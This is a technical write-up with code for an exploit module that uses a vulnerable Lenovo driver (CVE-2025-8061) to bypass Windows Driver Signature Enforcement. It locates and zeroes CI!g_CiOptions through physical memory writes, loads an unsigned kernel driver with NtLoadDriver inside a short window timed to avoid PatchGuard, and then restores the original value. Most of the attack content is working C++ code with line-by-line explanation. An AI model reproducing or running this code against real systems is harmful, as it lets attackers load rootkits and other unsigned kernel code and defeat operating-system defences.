# 05 — DSE Bypass (Driver Signature Enforcement)

**File:** `05_dse_bypass.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** Physical read/write + Kernel VA read (via page table walk)  
**Output:** Load an unsigned `.sys` driver via `NtLoadDriver`

---

## Objective

Locate `CI!g_CiOptions` in the memory of `ci.dll` and write `0x00` to it, disabling Driver Signature Enforcement. During that 5-second window, any unsigned `.sys` file can be loaded into the kernel.

---

## Background Theory

### What is g_CiOptions?

`CI.DLL` (Code Integrity) is the Windows module responsible for verifying driver signatures before loading. It stores the current policy in a global `DWORD` named `g_CiOptions`:

| Value | Meaning |
|-------|---------|
| `0x00` | DSE disabled — unsigned drivers are permitted |
| `0x06` | DSE enabled — normal default |
| `0x08` | HVCI enabled — hypervisor protects CI |
| `0x0E` | DSE + HVCI |

**g_CiOptions is not exported**. We must locate it by scanning the code of `CiInitialize` (which is exported) for any RIP-relative MOV instructions that reference it.

### HVCI (Hypervisor-Protected Code Integrity)

If HVCI is enabled, the Microsoft Hypervisor protects ci.dll pages using EPT (Extended Page Tables). Physical writes to those pages are **silently discarded** by the hypervisor. This technique **cannot bypass HVCI**. You must check `g_CiOptions & 0x08` first.

### Why is this Dangerous for PatchGuard?

PatchGuard (KPP) periodically verifies certain kernel structures and code integrity state. Leaving g_CiOptions = 0 too long → PatchGuard detects the change → BSOD 0x109. This code uses a **5-second countdown** instead of an indefinite `getchar()`.

---

## Line-by-Line Code Explanation

### KernelRead() — continuous kernel VA reading

```cpp
static bool KernelRead(uint64_t cr3, uint64_t va, void *buf, DWORD len)
{
    auto *dst = (uint8_t *)buf;
    while (len > 0) {
        uint64_t page_pa = VaToPa(cr3, va & ~0xFFFULL);
        // va & ~0xFFF: round down to the start of the page (4KB aligned)
        if (!page_pa) return false;
        
        DWORD off_in_page = (DWORD)(va & 0xFFF);       // offset within the current page
        DWORD to_read = min(len, 0x1000u - off_in_page); // do not cross page boundary
        
        if (!PhysRead(page_pa + off_in_page, dst, to_read)) return false;
        
        va  += to_read;   // advance VA
        dst += to_read;   // advance output buffer
        len -= to_read;   // decrement remaining length
    }
    return true;
}
```

A single `VaToPa()` call is only valid for one 4KB page. When a buffer spans multiple pages, `VaToPa` must be called for each page. `off_in_page = va & 0xFFF` = the offset within the current page.

### GetKernelModule() via NtQuerySystemInformation

```cpp
typedef LONG (NTAPI *pfnNtQSI)(ULONG,PVOID,ULONG,PULONG);

static bool GetKernelModule(const char *target, KM_INFO *out)
{
    auto NtQSI = (pfnNtQSI)GetProcAddress(GetModuleHandleA("ntdll"), "NtQuerySystemInformation");
    ULONG sz = 1 << 18;  // start with 256KB
    auto buf = (uint8_t*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz);
    
    // SystemModuleInformation = class 11
    // If buffer too small → 0xC0000004 (STATUS_INFO_LENGTH_MISMATCH) → double and retry
    while (NtQSI(11, buf, sz, &sz) == (LONG)0xC0000004)
        buf = (uint8_t*)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, sz *= 2);
```

On success, `buf` contains an array of structs describing every loaded kernel module, including base addresses.

```cpp
    struct MOD { HANDLE sec; PVOID mbase, imgbase; ULONG size, flags, loi, ioi, lc, oft; char path[256]; };
    ULONG n = *(ULONG*)buf;
    auto *mods = (MOD*)(buf + sizeof(ULONG));
    
    for (ULONG i = 0; i < n; i++) {
        const char *nm = mods[i].path + mods[i].oft;  // oft = offset to filename
        if (_stricmp(nm, target) == 0) {
            out->base = (uint64_t)(uintptr_t)mods[i].imgbase;  // kernel VA base
            out->size = mods[i].size;
```

`mods[i].imgbase` = kernel VA base address of the module. We use this to compute the address of the `CiInitialize` export.

### Reading the ci.dll PE Header and Finding the .data Section

```cpp
uint8_t hdr[0x1000] = {};
KernelRead(cr3, ci.base, hdr, sizeof(hdr));  // read 4KB = DOS + PE header

LONG lfanew = *(LONG*)(hdr + 0x3C);
WORD nsec   = *(WORD*)(hdr + lfanew + 6);   // NumberOfSections

// SizeOfOptionalHeader needed to precisely locate the section table
WORD opt_sz = *(WORD*)(hdr + lfanew + 4 + 0x10);  // COFF+0x10
DWORD sec_tbl_off = lfanew + 4 + 0x14 + opt_sz;   // PE sig + COFF + OptHdr

for (WORD s = 0; s < nsec && s < 16; s++) {
    DWORD off = sec_tbl_off + s * 40;   // IMAGE_SECTION_HEADER = 40 bytes
    const char *name = (const char*)(hdr + off);    // section name (8 chars)
    DWORD vsize = *(DWORD*)(hdr + off + 0x08);      // VirtualSize
    DWORD vrva  = *(DWORD*)(hdr + off + 0x0C);      // VirtualAddress (RVA)
    DWORD chars = *(DWORD*)(hdr + off + 0x24);      // Characteristics

    // .data section: writable (0x40000000) + readable (0x80000000)
    if (strncmp(name, ".data", 5) == 0 && (chars & 0xC0000000) == 0xC0000000) {
        data_va   = ci.base + vrva;   // kernel VA of .data
        data_size = vsize;
    }
}
```

`g_CiOptions` is a global DWORD residing in the `.data` section of ci.dll. We need these bounds to validate any address found during the scan.

### GetExportVA() — resolving CiInitialize

```cpp
static uint64_t GetExportVA(uint64_t cr3, uint64_t img_base,
                              const uint8_t *hdr, const char *funcname)
{
    LONG lfanew = *(LONG*)(hdr + 0x3C);
    DWORD exp_rva = *(DWORD*)(hdr + lfanew + 0x18 + 0x70);
    // OptionalHeader start (+0x18 from PE sig) + DataDirectory[0].VirtualAddress (+0x70)

    uint8_t expdir[40] = {};
    KernelRead(cr3, img_base + exp_rva, expdir, sizeof(expdir));

    DWORD num_names    = *(DWORD*)(expdir + 0x18);  // NumberOfNames
    DWORD rva_names    = *(DWORD*)(expdir + 0x20);  // AddressOfNames
    DWORD rva_ordinals = *(DWORD*)(expdir + 0x24);  // AddressOfNameOrdinals
    DWORD rva_funcs    = *(DWORD*)(expdir + 0x1C);  // AddressOfFunctions
```

To find `CiInitialize`:
1. Read `AddressOfNames` → array of RVAs to name strings
2. Iterate each name, compare against "CiInitialize"
3. On match: read ordinal from `AddressOfNameOrdinals[i]`
4. Use that ordinal to index into `AddressOfFunctions` → function RVA
5. Return `img_base + function_RVA`

### FindCiOptions() — Pattern Scan for RIP-Relative MOV

```cpp
static bool IsRipRelModRM(uint8_t modrm) { return (modrm & 0xC7) == 0x05; }
// ModRM byte: bits[7:6] = mod=00, bits[2:0] = rm=101 (= RIP-relative when mod=00)
// 0xC7 = 11000111b → mask bits [7:6] and [2:0]
// 0x05 = 00000101b → mod=00, rm=101

static uint64_t FindCiOptions(uint64_t cr3, uint64_t ci_base,
                               uint64_t data_va, uint32_t data_size,
                               uint64_t ci_init_va)
{
    uint8_t func[1024] = {};
    KernelRead(cr3, ci_init_va, func, sizeof(func));  // read 1KB of CiInitialize code

    for (int i = 0; i < (int)sizeof(func) - 6; i++) {
        uint8_t op    = func[i];     // opcode
        uint8_t modrm = func[i+1];  // ModRM byte

        // 8B = MOV reg, r/m (read from g_CiOptions)
        // 89 = MOV r/m, reg (write to g_CiOptions)
        if (op != 0x8B && op != 0x89) continue;
        if (!IsRipRelModRM(modrm)) continue;

        // Instruction is 6 bytes: op(1) + modrm(1) + imm32(4)
        int32_t  imm32     = *(int32_t *)(func + i + 2);
        // RIP = address of the NEXT instruction = ci_init_va + i + 6
        uint64_t target_va = ci_init_va + i + 6 + (int64_t)imm32;
```

RIP-relative addressing: in x64, `[RIP + imm32]` means address = RIP of the **next instruction** + sign-extended imm32.

```cpp
        // Only accept if target is within .data of ci.dll
        if (target_va < data_va || target_va + 4 > data_va + data_size) continue;

        uint32_t val = 0xDEAD;
        KernelRead(cr3, target_va, &val, 4);  // read 4 bytes at that address

        // g_CiOptions = 0x06 when DSE is normally enabled
        if (val == 0x06 || val == 0x08 || val == 0x0E || val == 0x00) {
            printf("  ← g_CiOptions candidate!\n");
            if (val == 0x06) return target_va;  // prefer the DSE-on case
        }
    }
    return 0;
}
```

Logic: if a `MOV reg, [RIP+X]` or `MOV [RIP+X], reg` targets an address in `.data` and the value at that address is `0x06` → this is very likely `g_CiOptions`.

### HVCI Detection and Write

```cpp
if (orig_val & 0x08) {
    // Bit 0x08 = HVCI flag
    printf("[!] HVCI is active. Physical writes to ci.dll pages are discarded\n");
    printf("    by the hypervisor's EPT. This technique CANNOT bypass HVCI.\n");
    CloseHandle(g_dev); return 1;
}

// Zero g_CiOptions
PhysWriteU32(ci_options_pa, 0x00);

// Verify
uint32_t after_val = 0xDEAD;
PhysRead(ci_options_pa, &after_val, 4);
```

### 5-Second Countdown (instead of an indefinite getchar)

```cpp
printf("[!] WARNING: PatchGuard (KPP) will BSOD the system if g_CiOptions\n");
printf("    stays zeroed too long (typically seconds to a few minutes).\n");
printf("    Auto-restoring in 5 seconds — load your driver NOW.\n");
for (int _i = 5; _i > 0; _i--) {
    printf("    %d...\n", _i);
    Sleep(1000);
}
```

5 seconds is sufficient for:
1. `sc start MyUnsignedDriver`, or
2. `NtLoadDriver("\\Registry\\Machine\\...")`

to complete. Do not leave it open longer — PatchGuard has a randomized timer.

### NtLoadDriver Helper

```cpp
static bool TryLoadDriver(const wchar_t *svcName, const wchar_t *sysPath)
{
    // Create registry key for NtLoadDriver to read
    wchar_t regPathWin[512];
    swprintf_s(regPathWin, L"SYSTEM\\CurrentControlSet\\Services\\%s", svcName);
    HKEY hKey = nullptr;
    RegCreateKeyExW(HKEY_LOCAL_MACHINE, regPathWin, ...);

    // Required values
    DWORD v = 1; RegSetValueExW(hKey, L"Type", ...);      // SERVICE_KERNEL_DRIVER
    v = 3;       RegSetValueExW(hKey, L"Start", ...);     // SERVICE_DEMAND_START
    v = 1;       RegSetValueExW(hKey, L"ErrorControl", ...);

    // ImagePath: must use \??\ prefix instead of C:\...
    wchar_t imgPath[512];
    swprintf_s(imgPath, L"\\??\\%s", sysPath);
    RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ, ...);
    RegCloseKey(hKey);

    // Call NtLoadDriver via ntdll
    auto NtLd = (pfnNtLd)GetProcAddress(GetModuleHandleA("ntdll"), "NtLoadDriver");
    UNICODE_STRING us = { ... regPath ... };
    LONG st = NtLd(&us);
    
    // 0xC0000603 or 0xC0000428 = signature error (DSE still active)
    // 0x00000000 = success
```

### RESTORE

```cpp
PhysWriteU32(ci_options_pa, orig_val);  // write back original value (0x06)
uint32_t restored = 0xDEAD;
PhysRead(ci_options_pa, &restored, 4);
// Expected: 0x06
```

---

## Stability

| Issue | Explanation |
|-------|-------------|
| **PatchGuard** | **Dangerous** — scans g_CiOptions. Safe window: a few seconds |
| **HVCI** | Cannot be bypassed. Detect with `orig_val & 0x08` |
| False positive scan | May incorrectly find a DWORD = 0x06 in .data. Code validates further using surrounding instructions |
| Driver loading race | If the driver takes more than 5 seconds to load, we restore first → load fails. Solution: increase the countdown |

---

## Flow Summary

```
GetKernelModule("CI.dll") → ci_base, ci_size

GetSystemCR3() → cr3

KernelRead(ci_base, header) → parse PE sections → data_va, data_size

GetExportVA("CiInitialize") → ci_init_va

Scan CiInitialize: MOV [RIP+X] instructions → target in .data with val=0x06
→ g_CiOptions_va

VaToPa(cr3, g_CiOptions_va) → ci_options_pa

Read: 0x06 (DSE enabled)
Check HVCI bit: if 0x08 → abort

PhysWriteU32(ci_options_pa, 0x00)  ← DSE DISABLED

5-second countdown: load unsigned driver now!

PhysWriteU32(ci_options_pa, 0x06)  ← RESTORE
```
